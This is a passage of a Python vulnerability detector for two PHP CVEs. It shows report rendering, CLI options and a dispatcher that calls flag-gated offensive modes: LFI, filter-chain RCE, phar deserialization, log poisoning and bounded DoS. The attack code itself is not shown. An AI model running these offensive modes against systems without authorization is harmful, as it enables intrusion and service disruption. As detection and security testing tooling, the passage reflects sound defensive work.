# ---------------------------------------------------------------- evidence chain
def build_evidence_chain(results):
    chain = []
    for r in results:
        if not isinstance(r, dict):
            continue
        mode = r.get("mode", "unknown")
        v = r.get("verdict", "unknown")
        detail = ""
        if mode == "remote":
            detail = f"PHP {r.get('php_version') or 'unknown'}"
        elif mode == "surface":
            detail = f"{len(r.get('multipart_forms',[]))} multipart form(s), {r.get('file_inputs',0)} file input(s)"
        elif mode == "deep-fingerprint":
            detail = f"{len(r.get('version_sources',[]))} version source(s); {len(r.get('notes',[]))} exposure note(s)"
        elif mode == "local":
            detail = f"{len(r.get('binaries',[]))} php binary/branches"
        elif mode == "logs":
            detail = f"OOM={r.get('oom_total',0)} UAF={r.get('uaf_total',0)} 5xx_clients={len(r.get('suspicious_ips',{}))}"
        elif mode == "asan":
            detail = "sanitizer stack traces available"
        elif mode == "error-signature":
            detail = f"categories={r.get('categories',{})}"
        elif mode == "differential":
            detail = f"{len(r.get('differences',[]))} probe-level difference(s)"
        elif mode == "ioc":
            detail = f"{len(r.get('suspicious_names',[]))} name(s), {len(r.get('suspicious_content',[]))} content match(es)"
        elif mode == "lab-verify":
            detail = f"{r.get('crashes',0)}/{len(r.get('rounds',[]))} crash(es)"
        elif mode == "impact-memory-disclosure":
            detail = f"disclosure rounds: {r.get('disclosure_rounds',0)}; patterns: {list(r.get('patterns_seen',{}).keys())}"
        elif mode == "impact-session-poison":
            detail = f"marker_reflected={r.get('marker_reflected',False)}"
        elif mode == "impact-worker-leak":
            detail = f"leaks={len(r.get('leaks',[]))}"
        elif mode == "impact-bounded-dos":
            detail = f"crash_rate={r.get('crash_rate_pct',0)}% recovered_after={r.get('recovered_after_s')}"
        elif mode == "offensive-session-lfi":
            detail = f"marker_via={r.get('marker_observed_via')}"
        elif mode == "offensive-session-traversal":
            detail = f"marker_via={r.get('marker_observed_via')}"
        elif mode == "offensive-upload-bypass-verify":
            detail = f"probe_reachable={r.get('probe_url_reachable',False)} ext={r.get('probe_extension','?')}"
        elif mode == "offensive-race-poison-confirm":
            detail = f"survived={r.get('markers_survived',0)}/{r.get('markers_planted',0)}"
        elif mode == "offensive-phpcode-exec-proof":
            detail = f"rce_confirmed={r.get('rce_confirmed',False)} via={r.get('rce_via')}"
        elif mode == "offensive-filter-chain-rce":
            detail = f"filter_reachable={r.get('filter_chain_reachable',False)} via={r.get('filter_via')}"
        elif mode == "offensive-phar-deserialization":
            detail = f"deserialization={r.get('deserialization_confirmed',False)} via={r.get('deserialization_via')}"
        elif mode == "offensive-tmpfile-race":
            detail = f"rce_confirmed={r.get('rce_confirmed',False)} via={r.get('rce_via')}"
        elif mode == "offensive-log-poisoning":
            detail = f"rce_confirmed={r.get('rce_confirmed',False)} via={r.get('rce_via')}"
        else:
            detail = "see report"
        chain.append({"label": mode, "verdict": v, "detail": detail})
    return chain


# ---------------------------------------------------------------- reports
def render_json_report(results, summary, chain, meta):
    return json.dumps({
        "tool": "php2shell-detect", "version": "3.4",
        "generated_at": now_iso(), "meta": meta,
        "summary": summary, "evidence_chain": chain,
        "results": _json_safe(results),
    }, indent=2, ensure_ascii=False)


def render_markdown_report(results, summary, chain, meta):
    sev_icon = {"critical": "CRITICAL", "high": "HIGH", "medium": "MEDIUM",
                "low": "LOW", "none": "NONE"}
    lines = [
        "# PHP2Shell Detection Report", "",
        f"**Generated:** {now_iso()}  ",
        f"**Tool:** php2shell-detect v3.4  ",
        f"**Target:** `{meta.get('target', 'N/A')}`  ",
        f"**Profile:** `{meta.get('profile', 'N/A')}`  ",
        f"**Offensive enabled:** `{meta.get('offensive_enabled', False)}`  ",
        "", "---", "", "## Executive Summary", "",
        "| Field | Value |", "|-------|-------|",
        f"| Final verdict | **{summary['final_verdict'].upper()}** |",
        f"| Severity | **{sev_icon.get(summary['severity'], summary['severity'])}** |",
        f"| Confidence | {summary['confidence'] * 100:.1f}% |",
        f"| Modes run | {summary['total_modes']} |",
        f"| Vulnerable | {summary['verdicts'].get('vulnerable', 0)} |",
        f"| Unknown | {summary['verdicts'].get('unknown', 0)} |",
        f"| Safe | {summary['verdicts'].get('safe', 0)} |", "",
    ]
    if summary["vulnerable_modes"]:
        lines += ["### Vulnerable Modes", ""]
        for m in summary["vulnerable_modes"]:
            lines.append(f"- `{m}`")
        lines.append("")
    if chain:
        lines += ["### Evidence Chain", ""]
        for i, item in enumerate(chain, 1):
            lines.append(f"{i}. **{item['label']}** — {item['verdict'].upper()}  ")
            lines.append(f"   {item['detail']}  ")
        lines.append("")
    lines += ["---", "", "## Per-Mode Details", ""]
    for r in results:
        if not isinstance(r, dict):
            continue
        mode = r.get("mode", "unknown")
        v = r.get("verdict", "unknown")
        icon = {"vulnerable": "VULNERABLE", "safe": "SAFE",
                "unknown": "UNKNOWN"}.get(v, v.upper())
        lines.append(f"### {mode} — {icon}")
        lines.append("")
        for k, val in r.items():
            if k in ("mode", "verdict"):
                continue
            if isinstance(val, (dict, list)) and val:
                lines.append(f"**{k}:**")
                lines.append("```json")
                lines.append(json.dumps(_json_safe(val), indent=2,
                                        ensure_ascii=False)[:2000])
                lines.append("```"); lines.append("")
            elif val is not None and val != "" and val != 0 and val != []:
                lines.append(f"- **{k}**: `{val}`")
        lines.append("")
    lines += ["---", "", "## Recommendations", "",
              "1. If **vulnerable**: upgrade PHP to the patched branch listed "
              "in `SAFE_BY_BRANCH`, or apply the distro security update.",
              "2. If **unknown**: run `--profile impact --i-own-this-target` "
              "in a lab to obtain crash/memory proof.",
              "3. For **critical** severity (offensive modes confirmed): treat "
              "as code-execution risk — patch immediately and rotate session "
              "secrets.",
              "4. For CI/CD: parse the JSON report (`--output report.json`) "
              "and fail the pipeline when `summary.final_verdict == 'vulnerable'`.",
              ""]
    return "\n".join(lines)


def write_evidence_bundle(results, summary, chain, meta, outdir):
    os.makedirs(outdir, exist_ok=True)
    raw = os.path.join(outdir, "raw")
    os.makedirs(raw, exist_ok=True)
    with open(os.path.join(outdir, "report.json"), "w", encoding="utf-8") as f:
        f.write(render_json_report(results, summary, chain, meta))
    md = [
        "# PHP2Shell Evidence Bundle\n\n",
        f"Generated: {now_iso()}  \n",
        f"CVEs: {', '.join(CVE_IDS)}  \n",
        f"CVSS: {CVSS['CVE-2026-109618']} (both)  \n",
        "Safe versions: PHP 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35  \n\n",
        "## Executive Summary\n\n",
        f"- Final verdict: **{summary['final_verdict']}**\n",
        f"- Severity: **{summary['severity']}**\n",
        f"- Confidence: {summary['confidence']*100:.1f}%\n\n",
        "## Evidence chain\n\n",
    ]
    for i, item in enumerate(chain, 1):
        md.append(f"{i}. **{item['label']}** - {item['verdict']}  \n")
        md.append(f"   {item['detail']}  \n\n")
    md.append("## Raw data\n\nSee `report.json` for full machine-readable output.\n")
    md.append("Raw per-mode outputs are in `raw/`.\n")
    with open(os.path.join(outdir, "README.md"), "w", encoding="utf-8") as f:
        f.write("".join(md))
    for r in results:
        if not isinstance(r, dict):
            continue
        mode = r.get("mode", "unknown")
        with open(os.path.join(raw, f"{mode}.json"), "w", encoding="utf-8") as f:
            json.dump(_json_safe(r), f, indent=2, ensure_ascii=False)
    return outdir


def generate_impact_report(results, outpath):
    os.makedirs(os.path.dirname(outpath) or ".", exist_ok=True)
    lines = [
        "# Impact Evidence - PHP2Shell (CVE-2026-109618/109619)\n\n",
        f"Generated: {now_iso()}\n\n",
        "## 1. Integrity Impact (Session Poisoning)\n\n",
    ]
    for r in results:
        if not isinstance(r, dict):
            continue
        if r.get("mode") == "impact-session-poison":
            lines.append(f"- Marker injected: `{r.get('marker')}`\n")
            lines.append(f"- Reflected in follow-up: **{r.get('marker_reflected')}**\n")
            lines.append(f"- Verdict: {r.get('verdict')}\n\n")
    lines.append("## 2. Confidentiality Impact (Cross-Session Leak)\n\n")
    for r in results:
        if isinstance(r, dict) and r.get("mode") == "impact-worker-leak":
            lines.append(f"- Leaks observed: **{len(r.get('leaks', []))}**\n")
            lines.append(f"- Verdict: {r.get('verdict')}\n\n")
    lines.append("## 3. Availability Impact (Bounded DoS)\n\n")
    for r in results:
        if isinstance(r, dict) and r.get("mode") == "impact-bounded-dos":
            lines.append(f"- Crash rate: **{r.get('crash_rate_pct')}%**\n")
            lines.append(f"- Median response: {r.get('median_response_s')}s\n")
            lines.append(f"- Recovery time: {r.get('recovered_after_s')}s\n")
            lines.append(f"- Verdict: {r.get('verdict')}\n\n")
    lines.append("## 4. Memory-Corruption Proof (ASAN)\n\n")
    lines.append("Reproduction guide attached: `asan-repro.md`.\n\n")
    lines.append("## 5. Offensive Impact Proofs\n\n")
    for r in results:
        if not isinstance(r, dict):
            continue
        m = r.get("mode", "")
        if m.startswith("offensive-"):
            lines.append(f"### {m}\n\n")
            lines.append(f"- Verdict: **{r.get('verdict')}**\n")
            if r.get("marker_observed_via"):
                lines.append(f"- Marker observed via: `{r['marker_observed_via']}`\n")
            if r.get("probe_url"):
                lines.append(f"- Probe URL: `{r['probe_url']}`\n")
            if "markers_survived" in r:
                lines.append(f"- Markers survived: {r.get('markers_survived')}/{r.get('markers_planted')}\n")
            lines.append("\n")
    with open(outpath, "w", encoding="utf-8") as f:
        f.write("".join(lines))
    return outpath


# ---------------------------------------------------------------- CLI
def build_parser():
    p = argparse.ArgumentParser(
        prog="php2shell-detect.py",
        description="Defensive detector + offensive impact-evidence builder "
                    "for CVE-2026-109618 / CVE-2026-109619 (PHP2Shell).",
        epilog="DEFENSIVE-FIRST with a BOUNDED offensive layer. "
               "Offensive modes require BOTH --i-own-this-target AND --enable-offensive.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--target", "-t", metavar="URL",
                   help="Target URL (e.g. https://example.com)")
    p.add_argument("--profile", choices=list(PROFILES.keys()),
                   help="Run a preset profile of modes")
    p.add_argument("--mode", metavar="CSV",
                   help="Comma-separated explicit mode list (overrides --profile)")
    p.add_argument("--local", action="store_true",
                   help="Shortcut for --profile local-only (no target needed)")

    # network options
    p.add_argument("--timeout", type=float, default=15.0,
                   help="Per-request timeout in seconds (default: 15)")
    p.add_argument("--user-agent", "--ua", default=DEFAULT_UA,
                   help="Custom User-Agent string")
    p.add_argument("--insecure", "-k", action="store_true",
                   help="Disable TLS certificate verification")
    p.add_argument("--probe-phpinfo", action="store_true",
                   help="Probe /phpinfo.php, /info.php, /test.php for version")

    # local mode inputs
    p.add_argument("--log-files", metavar="CSV",
                   help="Comma-separated access/error log paths for --mode logs")
    p.add_argument("--audit-file", metavar="PATH",
                   help="Audit/sensor log path for --mode audit")
    p.add_argument("--asan-files", metavar="CSV",
                   help="Comma-separated ASAN report paths for --mode asan")
    p.add_argument("--signature-files", metavar="CSV",
                   help="Comma-separated error log paths for --mode error-signature")
    p.add_argument("--ioc-dir", metavar="DIR",
                   help="Directory to scan for webshell IOCs")

    # lab / impact options
    p.add_argument("--i-own-this-target", action="store_true",
                   help="REQUIRED for any impact/offensive mode. Confirms you "
                        "own the target or have written authorization.")
    p.add_argument("--enable-offensive", action="store_true",
                   help="SECOND REQUIRED FLAG for offensive modes. "
                        "Double opt-in: --i-own-this-target alone is not enough.")
    p.add_argument("--rounds", type=int, default=5,
                   help="Rounds for lab-verify / crash-repro (default: 5)")
    p.add_argument("--fields", type=int, default=200,
                   help="Empty multipart fields per round (default: 200)")
    p.add_argument("--workers", type=int, default=4,
                   help="Concurrent workers for impact modes (default: 4, "
                        "use 1 for ASAN runs)")
    p.add_argument("--session-id", help="PHPSESSID for impact-session-write")
    p.add_argument("--marker", help="Custom marker string for session tests")
    p.add_argument("--session-file", metavar="PATH",
                   help="Server-side session file to check for marker")

    # offensive options
    p.add_argument("--upload-endpoint", metavar="PATH",
                   help="Upload endpoint for offensive-upload-bypass-verify "
                        "(e.g. /upload.php)")
    p.add_argument("--include-params", metavar="CSV",
                   help="Custom LFI parameter names for offensive-session-lfi "
                        "(default: include,page,file,path,...)")
    p.add_argument("--docroot-guesses", metavar="CSV",
                   help="Custom file endpoints for offensive-session-traversal "
                        "(default: /download.php,/file.php,...)")

    # thresholds
    p.add_argument("--max-log-lines", type=int, default=500_000,
                   help="Max lines to read per log file (default: 500000)")
    p.add_argument("--post-500-threshold", type=int, default=5,
                   help="POST-5xx count to flag an IP as suspicious (default: 5)")
    p.add_argument("--empty-parts-threshold", type=int, default=3,
                   help="Empty-filename parts to flag audit as vulnerable (default: 3)")
    p.add_argument("--ioc-max-files", type=int, default=200_000,
                   help="Max files for IOC scan (default: 200000)")

    # differential
    p.add_argument("--target-b", metavar="URL",
                   help="Second target for --mode differential (patched vs unpatched)")

    # output
    p.add_argument("--output", "-o", metavar="PATH",
                   help="Write JSON report to file")
    p.add_argument("--markdown", "-m", metavar="PATH",
                   help="Write Markdown report to file")
    p.add_argument("--asan-outdir", metavar="DIR",
                   help="Directory for --mode generate-asan-repro output")
    p.add_argument("--evidence-bundle", metavar="DIR",
                   help="Write evidence bundle (report.json + raw/ + README.md)")
    p.add_argument("--impact-report", metavar="PATH",
                   help="Write dedicated impact report (Markdown)")
    p.add_argument("--quiet", "-q", action="store_true",
                   help="Suppress progress/log output (still writes reports)")
    p.add_argument("--dry-run", action="store_true",
                   help="Plan only; impact modes will not send requests")
    p.add_argument("--json", action="store_true",
                   help="Print full JSON to stdout (overrides human-readable)")

    p.add_argument("--version", action="version",
                   version="php2shell-detect 3.5")
    return p


def resolve_modes(args):
    if args.local:
        return PROFILES["local-only"]
    if args.mode:
        return [m.strip() for m in args.mode.split(",") if m.strip()]
    if args.profile:
        return list(PROFILES[args.profile])
    if args.target:
        return PROFILES["standard"]
    return PROFILES["local-only"]


def requires_target(mode):
    return mode in ("remote", "surface", "deep-fingerprint", "differential",
                    "lab-verify", "crash-repro", "impact-session-write",
                    "impact-session-poison", "impact-worker-leak",
                    "impact-bounded-dos", "impact-memory-disclosure",
                    "offensive-session-lfi", "offensive-session-traversal",
                    "offensive-upload-bypass-verify",
                    "offensive-race-poison-confirm",
                    "offensive-phpcode-exec-proof",
                    "offensive-filter-chain-rce",
                    "offensive-phar-deserialization",
                    "offensive-tmpfile-race",
                    "offensive-log-poisoning")


def is_impact_mode(mode):
    return mode in ("lab-verify", "crash-repro", "impact-session-write",
                    "impact-session-poison", "impact-worker-leak",
                    "impact-bounded-dos", "impact-memory-disclosure")


def is_offensive_mode(mode):
    return mode in ("offensive-session-lfi", "offensive-session-traversal",
                    "offensive-upload-bypass-verify",
                    "offensive-race-poison-confirm",
                    "offensive-phpcode-exec-proof",
                    "offensive-filter-chain-rce",
                    "offensive-phar-deserialization",
                    "offensive-tmpfile-race",
                    "offensive-log-poisoning")


def run_mode(mode, args, ua):
    t = args.target or ""
    insecure = args.insecure
    timeout = args.timeout

    if requires_target(mode) and not args.target:
        return {"mode": mode, "verdict": "unknown",
                "error": "no --target provided for this mode"}
    if is_impact_mode(mode) and not args.i_own_this_target:
        return {"mode": mode, "verdict": "unknown",
                "error": "impact mode requires --i-own-this-target"}
    if is_offensive_mode(mode):
        if not args.i_own_this_target or not args.enable_offensive:
            return {"mode": mode, "verdict": "unknown",
                    "error": "offensive mode requires BOTH --i-own-this-target "
                             "AND --enable-offensive"}
        if args.dry_run and mode != "lab-verify":
            return {"mode": mode, "verdict": "unknown",
                    "error": "dry-run only supported for lab-verify; "
                             "offensive modes skipped"}

    try:
        if mode == "remote":
            return check_remote(t, timeout, ua, insecure, args.probe_phpinfo)
        if mode == "surface":
            return check_surface(t, timeout, ua, insecure)
        if mode == "deep-fingerprint":
            return check_deep_fingerprint(t, timeout, ua, insecure)
        if mode == "local":
            return check_local()
        if mode == "logs":
            paths = (args.log_files or "").split(",") if args.log_files else []
            return check_logs(paths, args.max_log_lines, args.post_500_threshold)
        if mode == "audit":
            return check_audit(args.audit_file or "", args.max_log_lines,
                               args.empty_parts_threshold)
        if mode == "asan":
            paths = (args.asan_files or "").split(",") if args.asan_files else []
            return check_asan(paths)
        if mode == "error-signature":
            paths = (args.signature_files or "").split(",") if args.signature_files else []
            return check_error_signature(paths, args.max_log_lines)
        if mode == "differential":
            if not args.target_b:
                return {"mode": mode, "verdict": "unknown",
                        "error": "differential requires --target-b"}
            return check_differential(t, args.target_b, timeout, ua, insecure)
        if mode == "ioc":
            return check_ioc(args.ioc_dir or "/", args.ioc_max_files)
        if mode == "lab-verify":
            return lab_verify(t, timeout, ua, insecure, args.rounds,
                              args.fields, dry_run=args.dry_run,
                              workers=args.workers, quiet=args.quiet)
        if mode == "crash-repro":
            return crash_repro(t, args.rounds, args.fields, timeout, ua,
                               insecure, workers=args.workers, quiet=args.quiet)
        if mode == "impact-session-write":
            sid = args.session_id or uuid.uuid4().hex
            marker = args.marker or ("PHP2SHELL_" + uuid.uuid4().hex[:10])
            res = impact_session_write(t, sid, marker, timeout, ua, insecure)
            if args.session_file:
                res["session_file_check"] = check_session_file(args.session_file, marker)
                res["verdict"] = res["session_file_check"]["verdict"]
            return res
        if mode == "impact-session-poison":
            return impact_session_poison(t, timeout, ua, insecure, args.marker)
        if mode == "impact-worker-leak":
            return impact_worker_leak(t, timeout, ua, insecure, trials=3)
        if mode == "impact-bounded-dos":
            return impact_bounded_dos(t, timeout, ua, insecure,
                                      rounds=max(args.rounds, 20), fields=300,
                                      workers=args.workers, quiet=args.quiet)
        if mode == "impact-memory-disclosure":
            return impact_memory_disclosure(t, timeout, ua, insecure,
                                            rounds=args.rounds, fields=300,
                                            workers=args.workers, quiet=args.quiet)
        if mode == "offensive-session-lfi":
            params = (args.include_params.split(",") if args.include_params else None)
            return offensive_session_lfi(t, timeout, ua, insecure, params,
                                         args.marker, args.quiet)
        if mode == "offensive-session-traversal":
            guesses = (args.docroot_guesses.split(",") if args.docroot_guesses else None)
            return offensive_session_traversal(t, timeout, ua, insecure, guesses,
                                               args.marker, args.quiet)
        if mode == "offensive-upload-bypass-verify":
            return offensive_upload_bypass_verify(t, timeout, ua, insecure,
                                                  args.upload_endpoint or "",
                                                  rounds=args.rounds,
                                                  fields=args.fields,
                                                  workers=args.workers,
                                                  quiet=args.quiet)
        if mode == "offensive-race-poison-confirm":
            return offensive_race_poison_confirm(t, timeout, ua, insecure,
                                                 rounds=max(args.rounds, 50),
                                                 workers=args.workers,
                                                 quiet=args.quiet)
        if mode == "offensive-phpcode-exec-proof":
            params = (args.include_params.split(",") if args.include_params else None)
            return offensive_phpcode_exec_proof(t, timeout, ua, insecure, params,
                                                args.quiet)
        if mode == "offensive-filter-chain-rce":
            params = (args.include_params.split(",") if args.include_params else None)
            return offensive_filter_chain_rce(t, timeout, ua, insecure, params,
                                              args.quiet)
        if mode == "offensive-phar-deserialization":
            params = (args.include_params.split(",") if args.include_params else None)
            return offensive_phar_deserialization(t, timeout, ua, insecure,
                                                  args.upload_endpoint or "",
                                                  params,
                                                  rounds=args.rounds,
                                                  workers=args.workers,
                                                  quiet=args.quiet)
        if mode == "offensive-tmpfile-race":
            params = (args.include_params.split(",") if args.include_params else None)
            return offensive_tmpfile_race(t, timeout, ua, insecure, params,
                                          rounds=max(args.rounds, 30),
                                          workers=args.workers,
                                          quiet=args.quiet)
        if mode == "offensive-log-poisoning":
            params = (args.include_params.split(",") if args.include_params else None)
            log_paths = (args.log_files.split(",") if args.log_files else None)
            return offensive_log_poisoning(t, timeout, ua, insecure, params,
                                           log_paths, args.quiet)
        if mode == "generate-asan-repro":
            path = generate_asan_repro(args.asan_outdir or "./asan-output")
            return {"mode": "generate-asan-repro", "path": path,
                    "verdict": "unknown",
                    "notes": ["ASAN reproduction guide written to " + path]}
        return {"mode": mode, "verdict": "unknown",
                "error": f"unknown mode: {mode}"}
    except Exception as e:
        return {"mode": mode, "verdict": "unknown",
                "error": f"{type(e).__name__}: {e}"}


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)
    ua = args.user_agent
    modes = resolve_modes(args)

    meta = {
        "target": args.target or "(local)",
        "profile": args.profile or ("explicit" if args.mode else
                                    ("local-only" if args.local else "standard")),
        "modes": modes,
        "i_own_this_target": args.i_own_this_target,
        "offensive_enabled": args.enable_offensive,
        "dry_run": args.dry_run,
    }

    log(f"php2shell-detect v3.4 — modes: {', '.join(modes)}", "info", args.quiet)
    has_impact = any(is_impact_mode(m) for m in modes)
    has_offensive = any(is_offensive_mode(m) for m in modes)
    if has_offensive:
        if not (args.i_own_this_target and args.enable_offensive):
            log("Offensive modes requested but missing --i-own-this-target "
                "AND --enable-offensive. Those modes will be SKIPPED.",
                "warn", args.quiet)
        else:
            log(f"{C.BAD}OFFENSIVE MODES ENABLED.{C.RST} Confirming: you own "
                "this target and have written authorization. These modes "
                "prove impact only — they do NOT execute remote commands.",
                "warn", args.quiet)
    elif has_impact:
        if not args.i_own_this_target:
            log("Impact modes requested but --i-own-this-target not set. "
                "Those modes will be skipped.", "warn", args.quiet)
        else:
            log("Impact modes ENABLED. Confirming: you own this target "
                "or have written authorization.", "warn", args.quiet)

    results = []
    for i, mode in enumerate(modes):
        log(f"[{i+1}/{len(modes)}] running mode: {mode}", "step", args.quiet)
        res = run_mode(mode, args, ua)
        results.append(res)
        v = res.get("verdict", "unknown") if isinstance(res, dict) else "unknown"
        icon = {"vulnerable": f"{C.BAD}VULNERABLE{C.RST}",
                "safe": f"{C.OK}SAFE{C.RST}",
                "unknown": f"{C.WARN}UNKNOWN{C.RST}"}.get(v, v)
        log(f"  -> {mode}: {icon}", "info", args.quiet)

    summary = build_summary(results)
    chain = build_evidence_chain(results)

    # console summary
    if not args.json:
        log("", "info", args.quiet)
        log("=" * 66, "info", args.quiet)
        sev = summary["severity"].upper()
        log(f"FINAL VERDICT: {summary['final_verdict'].upper()}  "
            f"| SEVERITY: {sev}  "
            f"| CONFIDENCE: {summary['confidence']*100:.1f}%", "info", args.quiet)
        if summary["vulnerable_modes"]:
            log(f"Vulnerable modes: {', '.join(summary['vulnerable_modes'])}",
                "bad", args.quiet)
        if summary["unknown_modes"]:
            log(f"Unknown modes: {', '.join(summary['unknown_modes'])}",
                "warn", args.quiet)
        log("=" * 66, "info", args.quiet)

        # human-readable per-mode output
        for r in results:
            if not isinstance(r, dict):
                continue
            m = r.get("mode", "")
            if m == "remote":       print_remote(r)
            elif m == "surface":    print_surface(r)
            elif m == "deep-fingerprint": print_deep(r)
            elif m == "local":      print_local(r)
            elif m == "logs":       print_logs(r)
            elif m == "audit":      print_audit(r)
            elif m == "asan":       print_asan(r)
            elif m == "error-signature": print_error_sig(r)
            elif m == "differential": print_differential(r)
            elif m == "ioc":        print_ioc(r)
            elif m == "lab-verify": print_lab(r)
            elif m == "impact-memory-disclosure": print_memory_disclosure(r)
            elif m.startswith("offensive-"): print_offensive(r)
            elif m == "generate-asan-repro":
                log(f"ASAN guide -> {r.get('path')}", "ok", args.quiet)

        # evidence chain
        print("\n" + "=" * 66)
        print("  EVIDENCE CHAIN")
        print("=" * 66)
        for i, item in enumerate(chain, 1):
            print(f"  {i}. {tag(item['verdict'])} {item['label']}")
            print(f"     {C.DIM}{item['detail']}{C.RST}")
        print("=" * 66)

    # write reports
    if args.output:
        with open(args.output, "w", encoding="utf-8") as f:
            f.write(render_json_report(results, summary, chain, meta))
        log(f"JSON report -> {args.output}", "ok", args.quiet)
    if args.markdown:
        with open(args.markdown, "w", encoding="utf-8") as f:
            f.write(render_markdown_report(results, summary, chain, meta))
        log(f"Markdown report -> {args.markdown}", "ok", args.quiet)
    if args.evidence_bundle:
        write_evidence_bundle(results, summary, chain, meta, args.evidence_bundle)
        log(f"Evidence bundle -> {args.evidence_bundle}/", "ok", args.quiet)
    if args.impact_report:
        generate_impact_report(results, args.impact_report)
        log(f"Impact report -> {args.impact_report}", "ok", args.quiet)
    if args.json:
        print(render_json_report(results, summary, chain, meta))

    return {"safe": EXIT_SAFE, "unknown": EXIT_UNKNOWN,
            "vulnerable": EXIT_VULNERABLE}.get(summary["final_verdict"], EXIT_UNKNOWN)


if __name__ == "__main__":
    sys.exit(main())
